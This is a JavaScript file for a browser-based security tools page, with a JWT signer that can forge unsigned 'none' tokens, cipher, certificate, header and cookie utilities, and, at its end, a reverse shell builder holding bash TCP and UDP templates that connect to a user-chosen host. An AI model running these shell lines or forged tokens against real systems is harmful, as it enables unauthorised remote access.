/* Init for the extended /tools roster. All client-side. Every tool's
   setup is guarded by an element-existence check, so a per-tool page
   that only contains one panel won't crash the others. */
(() => {
  const $ = (id) => document.getElementById(id);
  function debounce(fn, ms = 120) {
    let t;
    return (...a) => { clearTimeout(t); t = setTimeout(() => fn(...a), ms); };
  }
  function setOut(el, text, ok = true) {
    if (!el) return;
    el.textContent = text;
    el.classList.toggle('is-empty', !ok || !text || text === '—');
  }
  function escapeHtml(s) {
    return String(s).replace(/[&<>"']/g, (c) => ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' }[c]));
  }
  function hex(buf) {
    return [...new Uint8Array(buf)].map((b) => b.toString(16).padStart(2, '0')).join('');
  }
  function fromHex(s) {
    s = s.replace(/[\s:]/g, '');
    if (!/^[0-9a-fA-F]*$/.test(s) || s.length % 2) return null;
    const out = new Uint8Array(s.length / 2);
    for (let i = 0; i < out.length; i++) out[i] = parseInt(s.slice(i * 2, i * 2 + 2), 16);
    return out;
  }
  function fromB64(s) {
    try {
      const bin = atob(s.trim().replace(/\s/g, ''));
      const out = new Uint8Array(bin.length);
      for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
      return out;
    } catch { return null; }
  }
  function bytesFromAny(s) {
    s = s.trim();
    if (!s) return null;
    if (/^[0-9a-fA-F\s:]+$/.test(s)) return fromHex(s);
    return fromB64(s);
  }
  function b64urlEncode(s) {
    const b = btoa(unescape(encodeURIComponent(s)));
    return b.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  }

  // =========================================================
  // JWT signer / forger
  // =========================================================
  if ($('jwts-out')) {
    const algEl = $('jwts-alg');
    const secEl = $('jwts-secret');
    const hdrEl = $('jwts-header');
    const pldEl = $('jwts-payload');
    const out   = $('jwts-out');

    async function hmac(algName, key, data) {
      const k = await crypto.subtle.importKey(
        'raw', new TextEncoder().encode(key),
        { name: 'HMAC', hash: algName }, false, ['sign']
      );
      return new Uint8Array(await crypto.subtle.sign('HMAC', k, new TextEncoder().encode(data)));
    }
    function bytesToB64url(bytes) {
      let s = '';
      for (const b of bytes) s += String.fromCharCode(b);
      return btoa(s).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
    }

    async function build() {
      let header, payload;
      try { header  = JSON.parse(hdrEl.value); } catch { setOut(out, '⚠ Header isn’t valid JSON', false); return; }
      try { payload = JSON.parse(pldEl.value); } catch { setOut(out, '⚠ Payload isn’t valid JSON', false); return; }
      const alg = algEl.value;
      header.alg = alg === 'none' ? 'none' : alg;
      header.typ = header.typ || 'JWT';
      const h = b64urlEncode(JSON.stringify(header));
      const p = b64urlEncode(JSON.stringify(payload));
      let s = '';
      if (alg !== 'none') {
        const map = { HS256: 'SHA-256', HS384: 'SHA-384', HS512: 'SHA-512' };
        const sig = await hmac(map[alg], secEl.value, h + '.' + p);
        s = bytesToB64url(sig);
      }
      out.textContent = `${h}.${p}.${s}`;
      out.classList.remove('is-empty');
    }
    [algEl, secEl, hdrEl, pldEl].forEach((el) => el.addEventListener('input', debounce(build, 150)));
    build();
  }

  // =========================================================
  // HMAC generator
  // =========================================================
  if ($('hmac-out')) {
    const algEl = $('hmac-algo');
    const keyEl = $('hmac-key');
    const msgEl = $('hmac-msg');
    const out   = $('hmac-out');
    async function run() {
      if (!keyEl.value || !msgEl.value) { setOut(out, 'type a key + message', false); return; }
      try {
        const k = await crypto.subtle.importKey(
          'raw', new TextEncoder().encode(keyEl.value),
          { name: 'HMAC', hash: algEl.value }, false, ['sign']
        );
        const sig = await crypto.subtle.sign('HMAC', k, new TextEncoder().encode(msgEl.value));
        setOut(out, hex(sig), true);
      } catch (e) {
        setOut(out, '⚠ ' + e.message, false);
      }
    }
    [algEl, keyEl, msgEl].forEach((el) => el.addEventListener('input', debounce(run, 150)));
  }

  // =========================================================
  // X.509 certificate parser (minimal ASN.1 walker)
  // =========================================================
  if ($('x509-out')) {
    const inEl  = $('x509-in');
    const out   = $('x509-out');

    function decodePem(pem) {
      const m = pem.match(/-----BEGIN CERTIFICATE-----([\s\S]+?)-----END CERTIFICATE-----/);
      if (!m) return null;
      return fromB64(m[1].replace(/\s/g, ''));
    }
    function parseLength(buf, off) {
      const b = buf[off];
      if (b < 0x80) return { len: b, off: off + 1 };
      const n = b & 0x7f;
      let len = 0;
      for (let i = 0; i < n; i++) len = (len << 8) | buf[off + 1 + i];
      return { len, off: off + 1 + n };
    }
    function readTLV(buf, off) {
      const tag = buf[off];
      const { len, off: o2 } = parseLength(buf, off + 1);
      return { tag, len, body: buf.subarray(o2, o2 + len), end: o2 + len };
    }
    // Walk Name (RDNSequence) → string CN if present
    function findCN(name) {
      // name is a SEQUENCE OF SET OF SEQUENCE { OID, value }
      let off = 0;
      while (off < name.length) {
        const set = readTLV(name, off);
        // SET → SEQUENCE { OID, val }
        const seq = readTLV(set.body, 0);
        const oid = readTLV(seq.body, 0);
        const val = readTLV(seq.body, oid.end);
        // CN OID = 2.5.4.3 → bytes 55 04 03
        if (oid.body[0] === 0x55 && oid.body[1] === 0x04 && oid.body[2] === 0x03) {
          return new TextDecoder().decode(val.body);
        }
        off = set.end;
      }
      return null;
    }
    function parseTime(tlv) {
      const s = new TextDecoder().decode(tlv.body);
      // UTCTime YYMMDDHHMMSSZ or GeneralizedTime YYYYMMDDHHMMSSZ
      const m = tlv.tag === 0x17
        ? s.match(/^(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})Z?/)
        : s.match(/^(\d{4})(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})Z?/);
      if (!m) return s;
      let [_, y, mo, d, h, mi, se] = m;
      if (tlv.tag === 0x17) y = (parseInt(y, 10) >= 50 ? '19' : '20') + y;
      return `${y}-${mo}-${d}T${h}:${mi}:${se}Z`;
    }

    async function run() {
      if (!inEl.value.trim()) { setOut(out, 'paste a PEM certificate', false); return; }
      const der = decodePem(inEl.value);
      if (!der) { setOut(out, '⚠ couldn’t find a PEM certificate block', false); return; }
      try {
        // Cert ::= SEQUENCE { tbsCertificate SEQUENCE { ... } ... }
        const cert = readTLV(der, 0);
        const tbs  = readTLV(cert.body, 0);
        let off = 0;
        // Optional version [0] EXPLICIT
        let first = readTLV(tbs.body, off);
        if (first.tag === 0xa0) off = first.end;
        const serial = readTLV(tbs.body, off); off = serial.end;
        const sigAlg = readTLV(tbs.body, off); off = sigAlg.end;
        const issuer = readTLV(tbs.body, off); off = issuer.end;
        const validity = readTLV(tbs.body, off); off = validity.end;
        const subject = readTLV(tbs.body, off);
        const validBytes = validity.body;
        const notBefore = readTLV(validBytes, 0);
        const notAfter  = readTLV(validBytes, notBefore.end);

        const sha1   = hex(await crypto.subtle.digest('SHA-1',   der));
        const sha256 = hex(await crypto.subtle.digest('SHA-256', der));
        const subCN  = findCN(subject.body) || '(unknown)';
        const issCN  = findCN(issuer.body)  || '(unknown)';
        const nb     = parseTime(notBefore);
        const na     = parseTime(notAfter);

        const fmt = (k, v) => `<span class="tool-out-label">${k}</span>  ${escapeHtml(v)}\n`;
        out.classList.remove('is-empty');
        out.innerHTML =
          fmt('subject CN', subCN) +
          fmt('issuer CN',  issCN) +
          fmt('not before', nb) +
          fmt('not after',  na) +
          fmt('SHA-1',      sha1) +
          fmt('SHA-256',    sha256) +
          fmt('serial',     hex(serial.body)) +
          fmt('size (DER)', der.length + ' bytes');
      } catch (e) {
        setOut(out, '⚠ parse failed: ' + e.message, false);
      }
    }
    inEl.addEventListener('input', debounce(run, 200));
  }

  // =========================================================
  // Cipher translator
  // =========================================================
  if ($('cipher-out')) {
    const inEl = $('cipher-in');
    const shEl = $('cipher-caesar-shift');
    const vkEl = $('cipher-vig-key');
    const out  = $('cipher-out');

    function rotN(s, n) {
      return s.replace(/[A-Za-z]/g, (c) => {
        const base = c <= 'Z' ? 65 : 97;
        return String.fromCharCode(((c.charCodeAt(0) - base + n) % 26 + 26) % 26 + base);
      });
    }
    function atbash(s) {
      return s.replace(/[A-Za-z]/g, (c) => {
        const base = c <= 'Z' ? 65 : 97;
        return String.fromCharCode(25 - (c.charCodeAt(0) - base) + base);
      });
    }
    function rot47(s) {
      return s.split('').map((c) => {
        const code = c.charCodeAt(0);
        if (code >= 33 && code <= 126) return String.fromCharCode(33 + ((code - 33 + 47) % 94));
        return c;
      }).join('');
    }
    const LEET = { a:'4', b:'8', e:'3', g:'6', i:'1', l:'1', o:'0', s:'5', t:'7', z:'2' };
    function leet(s) { return s.toLowerCase().split('').map((c) => LEET[c] || c).join(''); }

    function safeBtoa(s) { try { return btoa(unescape(encodeURIComponent(s))); } catch { return ''; } }
    function safeAtob(s) { try { return decodeURIComponent(escape(atob(s.trim()))); } catch { return ''; } }
    function strToHex(s) { return [...new TextEncoder().encode(s)].map((b) => b.toString(16).padStart(2, '0')).join(' '); }
    function hexToStr(s) {
      const bs = fromHex(s);
      if (!bs) return '';
      try { return new TextDecoder().decode(bs); } catch { return ''; }
    }
    function strToBin(s) { return [...new TextEncoder().encode(s)].map((b) => b.toString(2).padStart(8, '0')).join(' '); }
    function binToStr(s) {
      const groups = s.trim().split(/\s+/);
      if (!groups.every((g) => /^[01]+$/.test(g))) return '';
      try { return new TextDecoder().decode(new Uint8Array(groups.map((g) => parseInt(g, 2)))); } catch { return ''; }
    }
    function strToDec(s) { return [...new TextEncoder().encode(s)].join(' '); }
    function decToStr(s) {
      const groups = s.trim().split(/[\s,]+/);
      if (!groups.every((g) => /^\d+$/.test(g))) return '';
      try { return new TextDecoder().decode(new Uint8Array(groups.map((g) => parseInt(g, 10)))); } catch { return ''; }
    }
    const MORSE = {
      A:'.-',B:'-...',C:'-.-.',D:'-..',E:'.',F:'..-.',G:'--.',H:'....',I:'..',J:'.---',K:'-.-',L:'.-..',M:'--',
      N:'-.',O:'---',P:'.--.',Q:'--.-',R:'.-.',S:'...',T:'-',U:'..-',V:'...-',W:'.--',X:'-..-',Y:'-.--',Z:'--..',
      0:'-----',1:'.----',2:'..---',3:'...--',4:'....-',5:'.....',6:'-....',7:'--...',8:'---..',9:'----.',
    };
    const MORSE_REV = Object.fromEntries(Object.entries(MORSE).map(([k, v]) => [v, k]));
    function strToMorse(s) {
      return s.toUpperCase().split('').map((c) => MORSE[c] || (c === ' ' ? '/' : '')).filter(Boolean).join(' ');
    }
    function morseToStr(s) {
      return s.split(/\s+\/\s+|\s\/\s|\/| /).map((g) => MORSE_REV[g] || (g === '' ? ' ' : '')).join('');
    }
    function strToA1Z26(s) {
      return s.toUpperCase().split('').map((c) => {
        const code = c.charCodeAt(0);
        return code >= 65 && code <= 90 ? (code - 64) : (c === ' ' ? '/' : '');
      }).filter((x) => x !== '').join(' ');
    }
    function a1z26ToStr(s) {
      return s.trim().split(/\s+|-/).map((g) => {
        if (g === '/') return ' ';
        const n = parseInt(g, 10);
        return n >= 1 && n <= 26 ? String.fromCharCode(64 + n) : '';
      }).join('');
    }
    function vigEnc(s, key) {
      if (!key) return '';
      const k = key.toUpperCase().replace(/[^A-Z]/g, '');
      if (!k) return '';
      let i = 0;
      return s.replace(/[A-Za-z]/g, (c) => {
        const base = c <= 'Z' ? 65 : 97;
        const shift = k.charCodeAt(i++ % k.length) - 65;
        return String.fromCharCode(((c.charCodeAt(0) - base + shift) % 26) + base);
      });
    }
    function vigDec(s, key) {
      if (!key) return '';
      const k = key.toUpperCase().replace(/[^A-Z]/g, '');
      if (!k) return '';
      let i = 0;
      return s.replace(/[A-Za-z]/g, (c) => {
        const base = c <= 'Z' ? 65 : 97;
        const shift = k.charCodeAt(i++ % k.length) - 65;
        return String.fromCharCode(((c.charCodeAt(0) - base - shift + 26) % 26) + base);
      });
    }

    function run() {
      const v = inEl.value;
      if (!v) { setOut(out, 'type something to decode/encode', false); return; }
      const shift = parseInt(shEl.value, 10) || 3;
      const vkey  = vkEl.value;
      const rows = [
        ['ROT13',                rotN(v, 13)],
        [`Caesar (shift ${shift})`, rotN(v, shift)],
        ['Atbash',               atbash(v)],
        ['ROT47',                rot47(v)],
        ['Reverse',              v.split('').reverse().join('')],
        ['Leet',                 leet(v)],
        ['Base64 encode',        safeBtoa(v)],
        ['Base64 decode',        safeAtob(v)],
        ['Hex encode',           strToHex(v)],
        ['Hex decode',           hexToStr(v)],
        ['Binary encode',        strToBin(v)],
        ['Binary decode',        binToStr(v)],
        ['Decimal-bytes encode', strToDec(v)],
        ['Decimal-bytes decode', decToStr(v)],
        ['URL encode',           encodeURIComponent(v)],
        ['URL decode',           (() => { try { return decodeURIComponent(v); } catch { return ''; } })()],
        ['Morse encode',         strToMorse(v)],
        ['Morse decode',         morseToStr(v)],
        ['A1Z26 encode',         strToA1Z26(v)],
        ['A1Z26 decode',         a1z26ToStr(v)],
        [`Vigenère encode (key=${vkey || '∅'})`, vigEnc(v, vkey)],
        [`Vigenère decode (key=${vkey || '∅'})`, vigDec(v, vkey)],
      ];
      out.classList.remove('is-empty');
      out.innerHTML = rows.map(([label, val]) =>
        `<div style="margin-bottom:0.45rem;"><span class="tool-out-label">${label}</span><div style="font-family:var(--font-mono); font-size:0.85rem; color:${val ? 'var(--text)' : 'var(--text-dim)'}; word-break:break-all;">${val ? escapeHtml(val) : '—'}</div></div>`
      ).join('');
    }
    [inEl, shEl, vkEl].forEach((el) => el.addEventListener('input', debounce(run, 100)));
  }

  // =========================================================
  // Strings extractor
  // =========================================================
  if ($('strings-out')) {
    const inEl  = $('strings-in');
    const minEl = $('strings-min');
    const out   = $('strings-out');
    function run() {
      const bytes = bytesFromAny(inEl.value);
      if (!bytes) { setOut(out, 'paste a binary blob (hex or base64)', false); return; }
      const min = Math.max(2, parseInt(minEl.value, 10) || 4);
      const hits = [];
      let cur = '';
      for (const b of bytes) {
        if (b >= 0x20 && b <= 0x7e) cur += String.fromCharCode(b);
        else { if (cur.length >= min) hits.push(cur); cur = ''; }
      }
      if (cur.length >= min) hits.push(cur);
      if (!hits.length) { setOut(out, '(no runs ≥ ' + min + ' chars)', false); return; }
      out.classList.remove('is-empty');
      out.textContent = hits.join('\n');
    }
    [inEl, minEl].forEach((el) => el.addEventListener('input', debounce(run, 150)));
  }

  // =========================================================
  // File-type identifier (magic bytes)
  // =========================================================
  if ($('magic-out')) {
    const inEl = $('magic-in');
    const out  = $('magic-out');
    const SIGS = [
      { hex: '89504E470D0A1A0A', name: 'PNG image' },
      { hex: 'FFD8FF',           name: 'JPEG image' },
      { hex: '47494638',         name: 'GIF image' },
      { hex: '424D',             name: 'BMP image' },
      { hex: '52494646',         name: 'RIFF (WAV / WebP / AVI)' },
      { hex: '00000018667479706D703432', name: 'MP4 video', off: 0 },
      { hex: '494433',           name: 'MP3 with ID3v2' },
      { hex: '25504446',         name: 'PDF' },
      { hex: '504B0304',         name: 'ZIP (or DOCX/XLSX/PPTX/JAR/APK)' },
      { hex: '504B0506',         name: 'ZIP (empty)' },
      { hex: '504B0708',         name: 'ZIP (spanned)' },
      { hex: '1F8B',             name: 'gzip' },
      { hex: '425A68',           name: 'bzip2' },
      { hex: 'FD377A585A00',     name: 'xz' },
      { hex: '7573746172',       name: 'tar', off: 257 },
      { hex: '7F454C46',         name: 'ELF executable' },
      { hex: '4D5A',             name: 'PE / Windows executable' },
      { hex: 'CAFEBABE',         name: 'Mach-O fat / Java class' },
      { hex: 'CFFAEDFE',         name: 'Mach-O 64-bit (LE)' },
      { hex: 'FEEDFACE',         name: 'Mach-O 32-bit (BE)' },
      { hex: 'FEEDFACF',         name: 'Mach-O 64-bit (BE)' },
      { hex: '7B5C72746631',     name: 'RTF document' },
      { hex: 'D0CF11E0A1B11AE1', name: 'MS Compound (DOC/XLS/MSI)' },
      { hex: '3C3F786D6C',       name: 'XML' },
      { hex: '3C68746D6C',       name: 'HTML' },
      { hex: '3C21444F4354',     name: 'HTML (DOCTYPE)' },
      { hex: '7B22',             name: 'JSON-ish ({"…)' },
      { hex: '5B22',             name: 'JSON-ish ([")' },
      { hex: '53514C69746520666F726D6174203300', name: 'SQLite 3 database' },
      { hex: '4F676753',         name: 'OGG container' },
      { hex: '666C6143',         name: 'FLAC audio' },
      { hex: 'EFBBBF',           name: 'UTF-8 BOM (text)' },
      { hex: 'FFFE',             name: 'UTF-16 LE BOM' },
      { hex: 'FEFF',             name: 'UTF-16 BE BOM' },
      { hex: '38425053',         name: 'PSD (Photoshop)' },
    ];
    function matchesAt(bytes, sigHex, off = 0) {
      const sig = fromHex(sigHex);
      if (!sig || bytes.length < off + sig.length) return false;
      for (let i = 0; i < sig.length; i++) if (bytes[off + i] !== sig[i]) return false;
      return true;
    }
    function run() {
      const bytes = bytesFromAny(inEl.value);
      if (!bytes) { setOut(out, 'paste at least the first 16 bytes (hex or base64)', false); return; }
      const hits = SIGS.filter((s) => matchesAt(bytes, s.hex, s.off || 0));
      if (!hits.length) { setOut(out, '(no match in the built-in table)', false); return; }
      out.classList.remove('is-empty');
      out.innerHTML = hits.map((h) =>
        `<div><span class="tool-pill">${h.name}</span>  <span class="dim mono" style="font-size:0.8rem;">${h.hex}</span></div>`
      ).join('');
    }
    inEl.addEventListener('input', debounce(run, 150));
  }

  // =========================================================
  // HTTP headers analyzer
  // =========================================================
  if ($('headers-out')) {
    const inEl = $('headers-in');
    const out  = $('headers-out');

    const RULES = [
      { name: 'Strict-Transport-Security', good: (v) => /max-age=\d+/.test(v), tip: 'should set max-age (≥ 6 months) and include subdomains' },
      { name: 'Content-Security-Policy',   good: (v) => v.length > 0 && !/unsafe-inline/.test(v), tip: 'present + no unsafe-inline' },
      { name: 'X-Frame-Options',           good: (v) => /^(DENY|SAMEORIGIN)$/i.test(v), tip: 'DENY or SAMEORIGIN (CSP frame-ancestors is the modern equivalent)' },
      { name: 'X-Content-Type-Options',    good: (v) => /^nosniff$/i.test(v), tip: 'must be exactly nosniff' },
      { name: 'Referrer-Policy',           good: (v) => /(no-referrer|strict-origin|same-origin)/i.test(v) },
      { name: 'Permissions-Policy',        good: (v) => v.length > 0 },
      { name: 'X-XSS-Protection',          good: () => true, tip: 'modern browsers ignore this; CSP is what matters' },
      { name: 'Cross-Origin-Opener-Policy', good: (v) => /same-origin/i.test(v) },
      { name: 'Cross-Origin-Resource-Policy', good: (v) => /(same-origin|same-site)/i.test(v) },
    ];

    function run() {
      const lines = inEl.value.split(/\r?\n/).map((l) => l.trim()).filter(Boolean);
      if (!lines.length) { setOut(out, 'paste response headers', false); return; }
      const found = {};
      for (const ln of lines) {
        const m = ln.match(/^([A-Za-z0-9-]+)\s*:\s*(.+)$/);
        if (m) found[m[1].toLowerCase()] = m[2];
      }
      const rows = RULES.map((r) => {
        const v = found[r.name.toLowerCase()];
        if (v == null) return { name: r.name, status: 'miss', val: '—' };
        return { name: r.name, status: r.good(v) ? 'ok' : 'warn', val: v, tip: r.tip };
      });
      out.classList.remove('is-empty');
      out.innerHTML = rows.map((r) => {
        const colour = r.status === 'ok' ? 'var(--terminal,#39ff7a)' : r.status === 'warn' ? '#ffb74d' : 'var(--hard,#ff6b6b)';
        const sym    = r.status === 'ok' ? '✓' : r.status === 'warn' ? '⚠' : '✗';
        return `<div style="margin-bottom:0.45rem;"><span style="color:${colour}; font-weight:600;">${sym}</span> <span class="tool-out-label" style="display:inline;">${r.name}</span><div style="font-family:var(--font-mono); font-size:0.8rem; word-break:break-all;">${escapeHtml(r.val)}</div>${r.tip ? `<div class="dim" style="font-size:0.78rem;">${r.tip}</div>` : ''}</div>`;
      }).join('');
    }
    inEl.addEventListener('input', debounce(run, 150));
  }

  // =========================================================
  // Cookie parser
  // =========================================================
  if ($('cookie-out')) {
    const inEl = $('cookie-in');
    const out  = $('cookie-out');
    function run() {
      const raw = inEl.value.trim();
      if (!raw) { setOut(out, 'paste a cookie', false); return; }
      // Strip an optional "Set-Cookie:" / "Cookie:" header prefix
      const body = raw.replace(/^(set-cookie|cookie):\s*/i, '');
      const parts = body.split(';').map((p) => p.trim()).filter(Boolean);
      if (!parts.length) { setOut(out, '⚠ couldn’t parse', false); return; }
      const [first, ...attrs] = parts;
      const eq = first.indexOf('=');
      const name = eq > 0 ? first.slice(0, eq) : first;
      const value = eq > 0 ? first.slice(eq + 1) : '';
      const flags = {};
      for (const a of attrs) {
        const e = a.indexOf('=');
        const k = (e > 0 ? a.slice(0, e) : a).toLowerCase();
        flags[k] = e > 0 ? a.slice(e + 1) : true;
      }
      const security = [
        { k: 'Secure',    have: flags['secure'] === true,    tip: 'cookie sent over HTTPS only' },
        { k: 'HttpOnly',  have: flags['httponly'] === true,  tip: 'JS can’t read this cookie' },
        { k: 'SameSite',  have: !!flags['samesite'], val: flags['samesite'], tip: 'CSRF defence; want Lax or Strict' },
      ];
      out.classList.remove('is-empty');
      out.innerHTML =
        `<div style="margin-bottom:0.5rem;"><span class="tool-out-label">name</span>  <span class="mono">${escapeHtml(name)}</span></div>` +
        `<div style="margin-bottom:0.5rem;"><span class="tool-out-label">value</span>  <span class="mono" style="word-break:break-all;">${escapeHtml(value)}</span></div>` +
        security.map((s) => {
          const colour = s.have ? 'var(--terminal,#39ff7a)' : 'var(--hard,#ff6b6b)';
          const sym    = s.have ? '✓' : '✗';
          const valTxt = s.val && s.val !== true ? ' = ' + escapeHtml(s.val) : '';
          return `<div><span style="color:${colour}; font-weight:600;">${sym}</span> ${s.k}${valTxt} <span class="dim" style="font-size:0.78rem;">— ${s.tip}</span></div>`;
        }).join('') +
        (Object.keys(flags).filter((k) => !['secure','httponly','samesite'].includes(k)).length
          ? `<div style="margin-top:0.5rem;"><span class="tool-out-label">other attrs</span>` +
            Object.entries(flags).filter(([k]) => !['secure','httponly','samesite'].includes(k))
              .map(([k, v]) => `<div class="mono" style="font-size:0.85rem;">${k}${v === true ? '' : '=' + escapeHtml(v)}</div>`).join('') +
            `</div>`
          : '');
    }
    inEl.addEventListener('input', debounce(run, 150));
  }

  // =========================================================
  // User-agent parser
  // =========================================================
  if ($('ua-out')) {
    const inEl = $('ua-in');
    const out  = $('ua-out');
    function detect(ua) {
      const r = { browser: 'Unknown', engine: 'Unknown', os: 'Unknown', device: 'Desktop', bot: false };
      // Browser
      if (/Edg\//.test(ua))        r.browser = 'Edge ' + (ua.match(/Edg\/([\d.]+)/) || [])[1];
      else if (/OPR\//.test(ua))   r.browser = 'Opera ' + (ua.match(/OPR\/([\d.]+)/) || [])[1];
      else if (/Chrome\//.test(ua))r.browser = 'Chrome ' + (ua.match(/Chrome\/([\d.]+)/) || [])[1];
      else if (/Firefox\//.test(ua))r.browser= 'Firefox ' + (ua.match(/Firefox\/([\d.]+)/) || [])[1];
      else if (/Safari\//.test(ua))r.browser = 'Safari ' + (ua.match(/Version\/([\d.]+)/) || [])[1];
      // Engine
      if (/Gecko\//.test(ua) && /Firefox/.test(ua)) r.engine = 'Gecko';
      else if (/AppleWebKit/.test(ua)) r.engine = /Chrome|Edg/.test(ua) ? 'Blink' : 'WebKit';
      // OS
      if (/Windows NT 10/.test(ua))     r.os = 'Windows 10/11';
      else if (/Windows NT/.test(ua))   r.os = 'Windows';
      else if (/Mac OS X 1[0-9_]+/.test(ua)) r.os = 'macOS ' + (ua.match(/Mac OS X ([\d_]+)/) || [])[1].replace(/_/g, '.');
      else if (/Android \d/.test(ua))   r.os = 'Android ' + (ua.match(/Android ([\d.]+)/) || [])[1];
      else if (/iPhone OS|iPad/.test(ua))r.os = 'iOS ' + (ua.match(/OS ([\d_]+)/) || [])[1].replace(/_/g, '.');
      else if (/Linux/.test(ua))        r.os = 'Linux';
      // Device
      if (/iPhone/.test(ua))       r.device = 'Phone (iPhone)';
      else if (/iPad/.test(ua))    r.device = 'Tablet (iPad)';
      else if (/Android/.test(ua) && /Mobile/.test(ua)) r.device = 'Phone (Android)';
      else if (/Android/.test(ua)) r.device = 'Tablet (Android)';
      // Bot
      if (/bot|crawl|spider|slurp|wget|curl|httpx|nuclei/i.test(ua)) r.bot = true;
      return r;
    }
    function run() {
      const v = inEl.value.trim();
      if (!v) { setOut(out, 'paste a UA string', false); return; }
      const r = detect(v);
      out.classList.remove('is-empty');
      const fmt = (k, v) => `<span class="tool-out-label">${k}</span>  ${escapeHtml(v)}\n`;
      out.innerHTML =
        fmt('browser', r.browser) + fmt('engine',  r.engine) +
        fmt('OS',      r.os)      + fmt('device',  r.device) +
        fmt('bot?',    r.bot ? 'yes' : 'no');
    }
    inEl.addEventListener('input', debounce(run, 150));
  }

  // =========================================================
  // URL splitter
  // =========================================================
  if ($('urlsplit-out')) {
    const inEl = $('urlsplit-in');
    const out  = $('urlsplit-out');
    function run() {
      const v = inEl.value.trim();
      if (!v) { setOut(out, 'paste a URL', false); return; }
      try {
        const u = new URL(v);
        const params = [...u.searchParams.entries()];
        const fmt = (k, v) => `<span class="tool-out-label">${k}</span>  ${escapeHtml(v)}\n`;
        out.classList.remove('is-empty');
        out.innerHTML =
          fmt('protocol', u.protocol) +
          fmt('host',     u.host) +
          fmt('hostname', u.hostname) +
          fmt('port',     u.port || '(default)') +
          fmt('pathname', u.pathname) +
          fmt('search',   u.search || '(none)') +
          fmt('hash',     u.hash || '(none)') +
          (params.length
            ? `<span class="tool-out-label">query params</span>\n` +
              params.map(([k, vv]) => `  ${escapeHtml(k)} = ${escapeHtml(vv)}`).join('\n')
            : '');
      } catch (e) {
        setOut(out, '⚠ ' + e.message, false);
      }
    }
    inEl.addEventListener('input', debounce(run, 100));
  }

  // =========================================================
  // Regex tester
  // =========================================================
  if ($('regex-out')) {
    const pEl = $('regex-pattern');
    const fEl = $('regex-flags');
    const tEl = $('regex-text');
    const out = $('regex-out');
    const list = $('regex-list');
    function run() {
      const pat = pEl.value;
      const flagsRaw = fEl.value || 'g';
      const txt = tEl.value;
      if (!pat) { setOut(out, 'type a pattern', false); list.textContent = '—'; list.classList.add('is-empty'); return; }
      let re;
      try {
        const flags = flagsRaw.includes('g') ? flagsRaw : flagsRaw + 'g';
        re = new RegExp(pat, flags);
      } catch (e) {
        setOut(out, '⚠ invalid regex: ' + e.message, false);
        list.textContent = '—'; list.classList.add('is-empty');
        return;
      }
      // Highlight
      let html = '';
      let last = 0;
      const matches = [];
      let m;
      let count = 0;
      while ((m = re.exec(txt)) !== null && count++ < 1000) {
        html += escapeHtml(txt.slice(last, m.index));
        html += `<mark style="background:var(--accent-soft); color:var(--accent); padding:0 2px; border-radius:2px;">${escapeHtml(m[0])}</mark>`;
        last = m.index + m[0].length;
        matches.push(m);
        if (m[0].length === 0) re.lastIndex++;
      }
      html += escapeHtml(txt.slice(last));
      out.classList.remove('is-empty');
      out.innerHTML = html || '<span class="dim">(no matches)</span>';
      // Match list
      if (matches.length) {
        list.classList.remove('is-empty');
        list.innerHTML = matches.slice(0, 50).map((m, i) =>
          `<div><span class="tool-out-label">#${i + 1} @${m.index}</span> ${escapeHtml(m[0])}` +
            (m.length > 1 ? '  <span class="dim">groups:</span> ' + m.slice(1).map((g) => escapeHtml(g ?? '∅')).join(' / ') : '') +
          `</div>`
        ).join('') + (matches.length > 50 ? `<div class="dim">…and ${matches.length - 50} more</div>` : '');
      } else {
        list.classList.add('is-empty');
        list.textContent = '—';
      }
    }
    [pEl, fEl, tEl].forEach((el) => el.addEventListener('input', debounce(run, 100)));
  }

  // =========================================================
  // Subnet splitter
  // =========================================================
  if ($('subsplit-out')) {
    const cEl = $('subsplit-cidr');
    const pEl = $('subsplit-newpref');
    const out = $('subsplit-out');

    function ipToInt(ip) {
      const parts = ip.split('.').map(Number);
      if (parts.length !== 4 || parts.some((n) => isNaN(n) || n < 0 || n > 255)) return null;
      return ((parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]) >>> 0;
    }
    function intToIp(n) {
      return [(n >>> 24) & 0xff, (n >>> 16) & 0xff, (n >>> 8) & 0xff, n & 0xff].join('.');
    }
    function run() {
      const m = cEl.value.match(/^([\d.]+)\/(\d{1,2})$/);
      const newPref = parseInt(pEl.value, 10);
      if (!m) { setOut(out, '⚠ parent format: 10.0.0.0/16', false); return; }
      const baseInt = ipToInt(m[1]);
      const basePref = parseInt(m[2], 10);
      if (baseInt == null || basePref < 0 || basePref > 32) { setOut(out, '⚠ bad parent CIDR', false); return; }
      if (isNaN(newPref) || newPref < basePref || newPref > 32) { setOut(out, '⚠ new prefix must be ≥ ' + basePref + ' and ≤ 32', false); return; }
      const subnetSize = 2 ** (32 - newPref);
      const totalSubnets = 2 ** (newPref - basePref);
      const cap = Math.min(totalSubnets, 256);
      const baseMask = basePref === 0 ? 0 : (~((1 << (32 - basePref)) - 1)) >>> 0;
      const network = (baseInt & baseMask) >>> 0;
      const rows = [];
      for (let i = 0; i < cap; i++) {
        const start = (network + i * subnetSize) >>> 0;
        const end   = (start + subnetSize - 1) >>> 0;
        rows.push(`${intToIp(start)}/${newPref}  →  ${intToIp(start)} – ${intToIp(end)}  (${subnetSize.toLocaleString()} addrs)`);
      }
      out.classList.remove('is-empty');
      out.innerHTML =
        `<div class="dim" style="font-size:0.8rem; margin-bottom:0.4rem;">${totalSubnets.toLocaleString()} subnets total${totalSubnets > cap ? `; showing first ${cap}` : ''}</div>` +
        rows.map((r) => `<div class="mono" style="font-size:0.83rem;">${r}</div>`).join('');
    }
    [cEl, pEl].forEach((el) => el.addEventListener('input', debounce(run, 100)));
  }

  // =========================================================
  // Reverse shell builder
  // =========================================================
  if ($('revsh-out')) {
    const hEl = $('revsh-host');
    const pEl = $('revsh-port');
    const lEl = $('revsh-lang');
    const out = $('revsh-out');

    const TPLS = [
      ['bash (TCP)',           ({h, p}) => `bash -i >& /dev/tcp/${h}/${p} 0>&1`],
      ['bash (UDP)',           ({h, p}) => `bash -i >& /dev/udp/${h}/${p} 0>&1`],
